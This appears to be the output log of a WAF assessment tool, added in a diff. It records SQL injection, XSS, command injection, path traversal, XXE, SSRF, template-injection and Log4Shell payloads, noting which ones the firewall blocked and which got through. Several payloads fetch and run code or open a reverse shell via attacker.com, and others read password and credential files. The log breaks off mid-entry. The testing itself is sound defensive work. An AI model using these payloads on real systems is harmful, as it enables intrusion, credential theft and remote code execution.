+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.223s
+
+Test: CF-Managed: Shadow file access
+  Category: sensitive-files
+  Payload: /etc/shadow
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.217s
+
+Test: CF-Managed: AWS credentials access
+  Category: cloud-credentials
+  Payload: /aws/credentials
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.179s
+
+Test: CF-Managed: Environment file access
+  Category: sensitive-files
+  Payload: .env
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.205s
+
+Test: CF-Managed: Go pprof debug access
+  Category: debug-endpoints
+  Payload: /debug/pprof/
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.257s
+
+Test: CF-Managed: Git config access
+  Category: sensitive-files
+  Payload: /.git/config
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.120s
+  CF-Ray: 9bd6b0bb1ad1a219-MSP
+
+Test: CF-Managed: Apache server status
+  Category: debug-endpoints
+  Payload: /server-status
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.181s
+
+Test: CF-Managed: WordPress debug log
+  Category: wordpress
+  Payload: wp-content/debug.log
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.207s
+
+Test: SQLi: Basic SQLi - OR bypass
+  Category: SQL Injection
+  Payload: ' OR '1'='1
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.193s
+  CWE: CWE-89
+  OWASP: A03:2021-Injection
+
+Test: SQLi: SQLi with comment
+  Category: SQL Injection
+  Payload: ' OR '1'='1'--
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.106s
+  CF-Ray: 9bd6b0bfc9d3a219-MSP
+  CWE: CWE-89
+  OWASP: A03:2021-Injection
+
+Test: SQLi: SQLi with block comment
+  Category: SQL Injection
+  Payload: ' OR '1'='1'/*
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.234s
+  CWE: CWE-89
+  OWASP: A03:2021-Injection
+
+Test: SQLi: SQLi AND condition
+  Category: SQL Injection
+  Payload: 1' AND '1'='1
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.191s
+  CWE: CWE-89
+  OWASP: A03:2021-Injection
+
+Test: SQLi: UNION based SQLi
+  Category: SQL Injection
+  Payload: 1 UNION SELECT NULL,NULL,NULL--
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.194s
+  CF-Ray: 9bd6b0c3ffb8a219-MSP
+  CWE: CWE-89
+  OWASP: A03:2021-Injection
+
+Test: SQLi: UNION data extraction
+  Category: SQL Injection
+  Payload: 1 UNION SELECT username,password FROM users--
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.093s
+  CF-Ray: 9bd6b0c49890a219-MSP
+  CWE: CWE-89
+  OWASP: A03:2021-Injection
+
+Test: SQLi: SQLi DROP TABLE
+  Category: SQL Injection
+  Payload: '; DROP TABLE users;--
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.100s
+  CF-Ray: 9bd6b0c5596ea219-MSP
+  CWE: CWE-89
+  OWASP: A03:2021-Injection
+
+Test: SQLi: SQLi command execution
+  Category: SQL Injection
+  Payload: 1'; EXEC xp_cmdshell('whoami');--
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.115s
+  CF-Ray: 9bd6b0c60a99a219-MSP
+  CWE: CWE-89
+  OWASP: A03:2021-Injection
+
+Test: SQLi: MySQL comment SQLi
+  Category: SQL Injection
+  Payload: ' OR 1=1#
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.132s
+  CF-Ray: 9bd6b0c6ebe7a219-MSP
+  CWE: CWE-89
+  OWASP: A03:2021-Injection
+
+Test: SQLi: Simple auth bypass
+  Category: SQL Injection
+  Payload: admin'--
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.184s
+  CWE: CWE-89
+  OWASP: A03:2021-Injection
+
+Test: SQLi: ORDER BY injection
+  Category: SQL Injection
+  Payload: 1' ORDER BY 1--+
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.217s
+  CWE: CWE-89
+  OWASP: A03:2021-Injection
+
+Test: SQLi: GROUP BY injection
+  Category: SQL Injection
+  Payload: 1' GROUP BY 1--+
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.329s
+  CWE: CWE-89
+  OWASP: A03:2021-Injection
+
+Test: SQLi: Negative UNION SQLi
+  Category: SQL Injection
+  Payload: -1' UNION SELECT 1,2,3--+
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.099s
+  CF-Ray: 9bd6b0cc9ce0a219-MSP
+  CWE: CWE-89
+  OWASP: A03:2021-Injection
+
+Test: SQLi: Time-based blind SQLi
+  Category: SQL Injection
+  Payload: 1' AND SLEEP(5)--
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.103s
+  CF-Ray: 9bd6b0cd4e0ca219-MSP
+  CWE: CWE-89
+  OWASP: A03:2021-Injection
+
+Test: SQLi: Benchmark SQLi
+  Category: SQL Injection
+  Payload: 1' AND BENCHMARK(10000000,SHA1('test'))--
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.196s
+  CF-Ray: 9bd6b0ce983ba219-MSP
+  CWE: CWE-89
+  OWASP: A03:2021-Injection
+
+Test: SQLi: Subquery sleep SQLi
+  Category: SQL Injection
+  Payload: 1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.100s
+  CF-Ray: 9bd6b0cf5934a219-MSP
+  CWE: CWE-89
+  OWASP: A03:2021-Injection
+
+Test: SQLi: MSSQL time delay
+  Category: SQL Injection
+  Payload: 1' WAITFOR DELAY '0:0:5'--
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.098s
+  CF-Ray: 9bd6b0d01a65a219-MSP
+  CWE: CWE-89
+  OWASP: A03:2021-Injection
+
+Test: SQLi: MSSQL shutdown
+  Category: SQL Injection
+  Payload: 1'; SHUTDOWN;--
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.256s
+  CWE: CWE-89
+  OWASP: A03:2021-Injection
+
+Test: SQLi: Error-based SQLi
+  Category: SQL Injection
+  Payload: 1' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.100s
+  CF-Ray: 9bd6b0d26daea219-MSP
+  CWE: CWE-89
+  OWASP: A03:2021-Injection
+
+Test: SQLi: ExtractValue SQLi
+  Category: SQL Injection
+  Payload: 1' AND extractvalue(1,concat(0x7e,(SELECT version())))--
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.101s
+  CF-Ray: 9bd6b0d32edaa219-MSP
+  CWE: CWE-89
+  OWASP: A03:2021-Injection
+
+Test: XSS: Basic script tag XSS
+  Category: Cross-Site Scripting
+  Payload: <script>alert('XSS')</script>
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.095s
+  CF-Ray: 9bd6b0d3efcfa219-MSP
+  CWE: CWE-79
+  OWASP: A03:2021-Injection
+
+Test: XSS: IMG onerror XSS
+  Category: Cross-Site Scripting
+  Payload: <img src=x onerror=alert('XSS')>
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.088s
+  CF-Ray: 9bd6b0d488a7a219-MSP
+  CWE: CWE-79
+  OWASP: A03:2021-Injection
+
+Test: XSS: SVG onload XSS
+  Category: Cross-Site Scripting
+  Payload: <svg onload=alert('XSS')>
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.100s
+  CF-Ray: 9bd6b0d53988a219-MSP
+  CWE: CWE-79
+  OWASP: A03:2021-Injection
+
+Test: XSS: Body onload XSS
+  Category: Cross-Site Scripting
+  Payload: <body onload=alert('XSS')>
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.091s
+  CF-Ray: 9bd6b0d5ea7da219-MSP
+  CWE: CWE-79
+  OWASP: A03:2021-Injection
+
+Test: XSS: JavaScript protocol XSS
+  Category: Cross-Site Scripting
+  Payload: javascript:alert('XSS')
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.101s
+  CF-Ray: 9bd6b0d69b72a219-MSP
+  CWE: CWE-79
+  OWASP: A03:2021-Injection
+
+Test: XSS: Iframe XSS
+  Category: Cross-Site Scripting
+  Payload: <iframe src='javascript:alert(1)'>
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.096s
+  CF-Ray: 9bd6b0d75c69a219-MSP
+  CWE: CWE-79
+  OWASP: A03:2021-Injection
+
+Test: XSS: Input autofocus XSS
+  Category: Cross-Site Scripting
+  Payload: <input onfocus=alert('XSS') autofocus>
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.105s
+  CF-Ray: 9bd6b0d80d52a219-MSP
+  CWE: CWE-79
+  OWASP: A03:2021-Injection
+
+Test: XSS: Marquee XSS
+  Category: Cross-Site Scripting
+  Payload: <marquee onstart=alert('XSS')>
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.103s
+  CF-Ray: 9bd6b0d8de57a219-MSP
+  CWE: CWE-79
+  OWASP: A03:2021-Injection
+
+Test: XSS: Details ontoggle XSS
+  Category: Cross-Site Scripting
+  Payload: <details open ontoggle=alert('XSS')>
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.113s
+  CF-Ray: 9bd6b0d99f67a219-MSP
+  CWE: CWE-79
+  OWASP: A03:2021-Injection
+
+Test: XSS: Video source XSS
+  Category: Cross-Site Scripting
+  Payload: <video><source onerror=alert('XSS')>
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.118s
+  CF-Ray: 9bd6b0da58aea219-MSP
+  CWE: CWE-79
+  OWASP: A03:2021-Injection
+
+Test: XSS: Encoded XSS
+  Category: Cross-Site Scripting
+  Payload: '><script>alert(String.fromCharCode(88,83,83))</script>
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.138s
+  CF-Ray: 9bd6b0db7a49a219-MSP
+  CWE: CWE-79
+  OWASP: A03:2021-Injection
+
+Test: XSS: Base64 encoded XSS
+  Category: Cross-Site Scripting
+  Payload: <img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.100s
+  CF-Ray: 9bd6b0dc2b65a219-MSP
+  CWE: CWE-79
+  OWASP: A03:2021-Injection
+
+Test: XSS: SVG without space
+  Category: Cross-Site Scripting
+  Payload: <svg/onload=alert('XSS')>
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.104s
+  CF-Ray: 9bd6b0dcec84a219-MSP
+  CWE: CWE-79
+  OWASP: A03:2021-Injection
+
+Test: XSS: Nested tags XSS
+  Category: Cross-Site Scripting
+  Payload: <<script>alert('XSS')//<</script>
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.153s
+  CF-Ray: 9bd6b0ddfdffa219-MSP
+  CWE: CWE-79
+  OWASP: A03:2021-Injection
+
+Test: XSS: Split tag XSS
+  Category: Cross-Site Scripting
+  Payload: <scr<script>ipt>alert('XSS')</scr</script>ipt>
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.122s
+  CF-Ray: 9bd6b0debf93a219-MSP
+  CWE: CWE-79
+  OWASP: A03:2021-Injection
+
+Test: XSS: Attribute escape XSS
+  Category: Cross-Site Scripting
+  Payload: "><img src=x onerror=alert('XSS')>
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.138s
+  CF-Ray: 9bd6b0df98e8a219-MSP
+  CWE: CWE-79
+  OWASP: A03:2021-Injection
+
+Test: XSS: JS string break XSS
+  Category: Cross-Site Scripting
+  Payload: '-alert('XSS')-'
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.099s
+  CF-Ray: 9bd6b0e08a33a219-MSP
+  CWE: CWE-79
+  OWASP: A03:2021-Injection
+
+Test: XSS: Title escape XSS
+  Category: Cross-Site Scripting
+  Payload: </title><script>alert('XSS')</script>
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.103s
+  CF-Ray: 9bd6b0e14b41a219-MSP
+  CWE: CWE-79
+  OWASP: A03:2021-Injection
+
+Test: XSS: Textarea escape XSS
+  Category: Cross-Site Scripting
+  Payload: </textarea><script>alert('XSS')</script>
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.104s
+  CF-Ray: 9bd6b0e20c56a219-MSP
+  CWE: CWE-79
+  OWASP: A03:2021-Injection
+
+Test: XSS: MathML XSS
+  Category: Cross-Site Scripting
+  Payload: <math><maction actiontype='statusline#http://google.com' xlink:href='javascript:alert(1)'>
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.099s
+  CF-Ray: 9bd6b0e2cd8fa219-MSP
+  CWE: CWE-79
+  OWASP: A03:2021-Injection
+
+Test: CMDi: Basic command injection
+  Category: Command Injection
+  Payload: ; ls -la
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.225s
+  CWE: CWE-78
+  OWASP: A03:2021-Injection
+
+Test: CMDi: Pipe command injection
+  Category: Command Injection
+  Payload: | cat /etc/passwd
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.235s
+  CWE: CWE-78
+  OWASP: A03:2021-Injection
+
+Test: CMDi: Ampersand command injection
+  Category: Command Injection
+  Payload: & whoami
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.754s
+  CWE: CWE-78
+  OWASP: A03:2021-Injection
+
+Test: CMDi: Backtick command injection
+  Category: Command Injection
+  Payload: `id`
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.235s
+  CWE: CWE-78
+  OWASP: A03:2021-Injection
+
+Test: CMDi: Dollar command injection
+  Category: Command Injection
+  Payload: $(id)
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.217s
+  CWE: CWE-78
+  OWASP: A03:2021-Injection
+
+Test: CMDi: Semicolon injection
+  Category: Command Injection
+  Payload: ; cat /etc/passwd
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.205s
+  CWE: CWE-78
+  OWASP: A03:2021-Injection
+
+Test: CMDi: OR command injection
+  Category: Command Injection
+  Payload: || whoami
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.395s
+  CWE: CWE-78
+  OWASP: A03:2021-Injection
+
+Test: CMDi: AND command injection
+  Category: Command Injection
+  Payload: && id
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.237s
+  CWE: CWE-78
+  OWASP: A03:2021-Injection
+
+Test: CMDi: Newline injection
+  Category: Command Injection
+  Payload: 
+/bin/cat /etc/passwd
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.228s
+  CWE: CWE-78
+  OWASP: A03:2021-Injection
+
+Test: CMDi: Ping command injection
+  Category: Command Injection
+  Payload: ; ping -c 10 127.0.0.1
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.312s
+  CWE: CWE-78
+  OWASP: A03:2021-Injection
+
+Test: CMDi: Netcat reverse shell
+  Category: Command Injection
+  Payload: | nc -e /bin/sh attacker.com 4444
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.222s
+  CF-Ray: 9bd6b0f7ffdca219-MSP
+  CWE: CWE-78
+  OWASP: A03:2021-Injection
+
+Test: CMDi: Curl shell download
+  Category: Command Injection
+  Payload: ; curl http://attacker.com/shell.sh | sh
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.221s
+  CWE: CWE-78
+  OWASP: A03:2021-Injection
+
+Test: CMDi: Nested curl injection
+  Category: Command Injection
+  Payload: $(curl http://attacker.com/shell.sh | sh)
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.222s
+  CWE: CWE-78
+  OWASP: A03:2021-Injection
+
+Test: CMDi: Wget injection
+  Category: Command Injection
+  Payload: `wget http://attacker.com/malware -O /tmp/m && chmod +x /tmp/m && /tmp/m`
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.216s
+  CWE: CWE-78
+  OWASP: A03:2021-Injection
+
+Test: CMDi: Python injection
+  Category: Command Injection
+  Payload: | python -c 'import os; os.system("id")'
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.204s
+  CWE: CWE-78
+  OWASP: A03:2021-Injection
+
+Test: LFI: Basic path traversal
+  Category: Path Traversal
+  Payload: ../../../etc/passwd
+  Status: BLOCKED (HTTP 404)
+  Response Time: 0.182s
+  CWE: CWE-22
+  OWASP: A01:2021-Broken Access Control
+
+Test: LFI: Double dot traversal
+  Category: Path Traversal
+  Payload: ....//....//....//etc/passwd
+  Status: BLOCKED (HTTP 404)
+  Response Time: 0.182s
+  CWE: CWE-22
+  OWASP: A01:2021-Broken Access Control
+
+Test: LFI: URL encoded traversal
+  Category: Path Traversal
+  Payload: ..%2f..%2f..%2fetc/passwd
+  Status: NOT BLOCKED (HTTP 400)
+  Response Time: 0.071s
+  CF-Ray: -
+  CWE: CWE-22
+  OWASP: A01:2021-Broken Access Control
+
+Test: LFI: Double URL encoded
+  Category: Path Traversal
+  Payload: ..%252f..%252f..%252fetc/passwd
+  Status: BLOCKED (HTTP 404)
+  Response Time: 0.291s
+  CWE: CWE-22
+  OWASP: A01:2021-Broken Access Control
+
+Test: LFI: Null byte injection
+  Category: Path Traversal
+  Payload: /etc/passwd%00
+  Status: NOT BLOCKED (HTTP 400)
+  Response Time: 0.052s
+  CF-Ray: -
+  CWE: CWE-22
+  OWASP: A01:2021-Broken Access Control
+
+Test: LFI: Backslash traversal
+  Category: Path Traversal
+  Payload: ....\/....\/....\/etc/passwd
+  Status: BLOCKED (HTTP 404)
+  Response Time: 0.533s
+  CWE: CWE-22
+  OWASP: A01:2021-Broken Access Control
+
+Test: LFI: Full URL encoded
+  Category: Path Traversal
+  Payload: %2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
+  Status: NOT BLOCKED (HTTP 400)
+  Response Time: 0.054s
+  CF-Ray: -
+  CWE: CWE-22
+  OWASP: A01:2021-Broken Access Control
+
+Test: LFI: UTF-8 encoded traversal
+  Category: Path Traversal
+  Payload: ..%c0%af..%c0%af..%c0%afetc/passwd
+  Status: BLOCKED (HTTP 500)
+  Response Time: 0.293s
+  CWE: CWE-22
+  OWASP: A01:2021-Broken Access Control
+
+Test: LFI: Unicode slash traversal
+  Category: Path Traversal
+  Payload: ..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd
+  Status: BLOCKED (HTTP 404)
+  Response Time: 0.213s
+  CWE: CWE-22
+  OWASP: A01:2021-Broken Access Control
+
+Test: LFI: Proc environ access
+  Category: Path Traversal
+  Payload: /proc/self/environ
+  Status: BLOCKED (HTTP 404)
+  Response Time: 0.264s
+  CWE: CWE-22
+  OWASP: A01:2021-Broken Access Control
+
+Test: LFI: PHP filter wrapper
+  Category: Path Traversal
+  Payload: php://filter/convert.base64-encode/resource=index.php
+  Status: BLOCKED (HTTP 404)
+  Response Time: 0.219s
+  CWE: CWE-22
+  OWASP: A01:2021-Broken Access Control
+
+Test: LFI: File protocol
+  Category: Path Traversal
+  Payload: file:///etc/passwd
+  Status: BLOCKED (HTTP 404)
+  Response Time: 0.257s
+  CWE: CWE-22
+  OWASP: A01:2021-Broken Access Control
+
+Test: LFI: Windows SAM traversal
+  Category: Path Traversal
+  Payload: ....//....//....//windows/system32/config/sam
+  Status: BLOCKED (HTTP 404)
+  Response Time: 0.333s
+  CWE: CWE-22
+  OWASP: A01:2021-Broken Access Control
+
+Test: LFI: Triple encoded
+  Category: Path Traversal
+  Payload: %252e%252e%252f%252e%252e%252fetc/passwd
+  Status: BLOCKED (HTTP 404)
+  Response Time: 0.271s
+  CWE: CWE-22
+  OWASP: A01:2021-Broken Access Control
+
+Test: XXE: Basic XXE
+  Category: XML External Entity
+  Payload: <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.136s
+  CF-Ray: 9bd6b113fe2ca219-MSP
+  CWE: CWE-611
+  OWASP: A05:2021-Security Misconfiguration
+
+Test: XXE: External XXE
+  Category: XML External Entity
+  Payload: <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><foo>&xxe;</foo>
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.112s
+  CF-Ray: 9bd6b114df75a219-MSP
+  CWE: CWE-611
+  OWASP: A05:2021-Security Misconfiguration
+
+Test: XXE: Parameter entity XXE
+  Category: XML External Entity
+  Payload: <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">%xxe;]><foo>...
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.126s
+  CF-Ray: 9bd6b115989da219-MSP
+  CWE: CWE-611
+  OWASP: A05:2021-Security Misconfiguration
+
+Test: XXE: Expect wrapper XXE
+  Category: XML External Entity
+  Payload: <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.109s
+  CF-Ray: 9bd6b1166a27a219-MSP
+  CWE: CWE-611
+  OWASP: A05:2021-Security Misconfiguration
+
+Test: XXE: PHP filter XXE
+  Category: XML External Entity
+  Payload: <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource...
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.123s
+  CF-Ray: 9bd6b1171b6aa219-MSP
+  CWE: CWE-611
+  OWASP: A05:2021-Security Misconfiguration
+
+Test: SSRF: Localhost SSRF
+  Category: Server-Side Request Forgery
+  Payload: http://localhost/admin
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.197s
+  CWE: CWE-918
+  OWASP: A10:2021-SSRF
+
+Test: SSRF: Loopback SSRF
+  Category: Server-Side Request Forgery
+  Payload: http://127.0.0.1/admin
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.199s
+  CWE: CWE-918
+  OWASP: A10:2021-SSRF
+
+Test: SSRF: IPv6 localhost SSRF
+  Category: Server-Side Request Forgery
+  Payload: http://[::1]/admin
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.186s
+  CWE: CWE-918
+  OWASP: A10:2021-SSRF
+
+Test: SSRF: AWS metadata SSRF
+  Category: Server-Side Request Forgery
+  Payload: http://169.254.169.254/latest/meta-data/
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.324s
+  CWE: CWE-918
+  OWASP: A10:2021-SSRF
+
+Test: SSRF: GCP metadata SSRF
+  Category: Server-Side Request Forgery
+  Payload: http://metadata.google.internal/
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.273s
+  CWE: CWE-918
+  OWASP: A10:2021-SSRF
+
+Test: SSRF: Azure metadata SSRF
+  Category: Server-Side Request Forgery
+  Payload: http://169.254.169.254/metadata/v1/
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.425s
+  CWE: CWE-918
+  OWASP: A10:2021-SSRF
+
+Test: SSRF: Zero IP SSRF
+  Category: Server-Side Request Forgery
+  Payload: http://0.0.0.0:22
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.228s
+  CWE: CWE-918
+  OWASP: A10:2021-SSRF
+
+Test: SSRF: Short loopback SSRF
+  Category: Server-Side Request Forgery
+  Payload: http://127.1/admin
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.222s
+  CWE: CWE-918
+  OWASP: A10:2021-SSRF
+
+Test: SSRF: Decimal IP SSRF
+  Category: Server-Side Request Forgery
+  Payload: http://2130706433/
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.246s
+  CWE: CWE-918
+  OWASP: A10:2021-SSRF
+
+Test: SSRF: Hex IP SSRF
+  Category: Server-Side Request Forgery
+  Payload: http://0x7f000001/
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.192s
+  CWE: CWE-918
+  OWASP: A10:2021-SSRF
+
+Test: SSRF: Gopher SSRF
+  Category: Server-Side Request Forgery
+  Payload: gopher://localhost:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.335s
+  CWE: CWE-918
+  OWASP: A10:2021-SSRF
+
+Test: SSRF: Dict protocol SSRF
+  Category: Server-Side Request Forgery
+  Payload: dict://localhost:11211/stats
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.544s
+  CWE: CWE-918
+  OWASP: A10:2021-SSRF
+
+Test: SSRF: File protocol SSRF
+  Category: Server-Side Request Forgery
+  Payload: file:///etc/passwd
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.270s
+  CWE: CWE-918
+  OWASP: A10:2021-SSRF
+
+Test: SSTI: Jinja2/Twig basic SSTI
+  Category: Server-Side Template Injection
+  Payload: {{7*7}}
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.220s
+  CWE: CWE-1336
+  OWASP: A03:2021-Injection
+
+Test: SSTI: Generic template injection
+  Category: Server-Side Template Injection
+  Payload: ${7*7}
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.251s
+  CWE: CWE-1336
+  OWASP: A03:2021-Injection
+
+Test: SSTI: Ruby ERB injection
+  Category: Server-Side Template Injection
+  Payload: #{7*7}
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.231s
+  CWE: CWE-1336
+  OWASP: A03:2021-Injection
+
+Test: SSTI: ERB injection
+  Category: Server-Side Template Injection
+  Payload: <%= 7*7 %>
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.247s
+  CWE: CWE-1336
+  OWASP: A03:2021-Injection
+
+Test: SSTI: Angular SSTI
+  Category: Server-Side Template Injection
+  Payload: {{constructor.constructor('return this')()}}
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.189s
+  CF-Ray: 9bd6b1362dd7a219-MSP
+  CWE: CWE-1336
+  OWASP: A03:2021-Injection
+
+Test: SSTI: Flask config disclosure
+  Category: Server-Side Template Injection
+  Payload: {{config}}
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.243s
+  CWE: CWE-1336
+  OWASP: A03:2021-Injection
+
+Test: SSTI: Python SSTI RCE
+  Category: Server-Side Template Injection
+  Payload: {{self.__class__.__mro__[2].__subclasses__()}}
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.580s
+  CWE: CWE-1336
+  OWASP: A03:2021-Injection
+
+Test: SSTI: Polyglot template injection
+  Category: Server-Side Template Injection
+  Payload: ${{<%[%'"}}%\
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.126s
+  CF-Ray: 9bd6b13ca88ca219-MSP
+  CWE: CWE-1336
+  OWASP: A03:2021-Injection
+
+Test: SSTI: Jinja2 RCE
+  Category: Server-Side Template Injection
+  Payload: {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.244s
+  CWE: CWE-1336
+  OWASP: A03:2021-Injection
+
+Test: Log4Shell: Log4j basic
+  Category: Log4j RCE
+  Payload: ${jndi:ldap://attacker.com/exploit}
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.102s
+  CF-Ray: 9bd6b13f3c5da219-MSP
+  CWE: CWE-917
+  OWASP: A06:2021-Vulnerable Components
+  CVE: CVE-2021-44228
+
+Test: Log4Shell: Log4j RMI
+  Category: Log4j RCE
+  Payload: ${jndi:rmi://attacker.com/exploit}
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.146s
+  CF-Ray: 9bd6b13ffd8ba219-MSP
+  CWE: CWE-917
+  OWASP: A06:2021-Vulnerable Components
+  CVE: CVE-2021-44228
+
+Test: Log4Shell: Log4j obfuscated
+  Category: Log4j RCE
+  Payload: ${${lower:j}ndi:${lower:l}dap://attacker.com/exploit}
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.113s
+  CF-Ray: 9bd6b140ff35a219-MSP
+  CWE: CWE-917
+  OWASP: A06:2021-Vulnerable Components
+  CVE: CVE-2021-44228
+
+Test: Log4Shell: Log4j heavy obfuscation
+  Category: Log4j RCE
+  Payload: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/exploit}
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.110s
+  CF-Ray: 9bd6b141d882a219-MSP
+  CWE: CWE-917
+  OWASP: A06:2021-Vulnerable Components
+  CVE: CVE-2021-44228
+
+Test: Log4Shell: Log4j DNS bypass
+  Category: Log4j RCE
+  Payload: ${jndi:ldap://127.0.0.1#attacker.com/exploit}
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.133s
+  CF-Ray: 9bd6b142a9dba219-MSP
+  CWE: CWE-917
+  OWASP: A06:2021-Vulnerable Components
+  CVE: CVE-2021-44228
+
+Test: Scanner: Nikto scanner UA
+  Category: scanner-detection
+  Payload: Nikto
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.238s
+
+Test: Scanner: SQLmap scanner UA
+  Category: scanner-detection
+  Payload: sqlmap
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.266s
+
+Test: Scanner: Nessus scanner UA
+  Category: scanner-detection
+  Payload: Nessus
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.105s
+  CF-Ray: 9bd6b146d902a219-MSP
+
+Test: Scanner: Burp Suite scanner
+  Category: scanner-detection
+  Payload: Burp
+  Status: BLOCKED (HTTP 403)
+  Response Time: 0.116s
+  CF-Ray: 9bd6b1479a5ca219-MSP
+
+Test: Scanner: ZAP scanner UA
+  Category: scanner-detection
+  Payload: OWASP ZAP
+  Status: NOT BLOCKED (HTTP 200)
+  Response Time: 0.467s
+
+Test: Scanner: Acunetix scanner UA
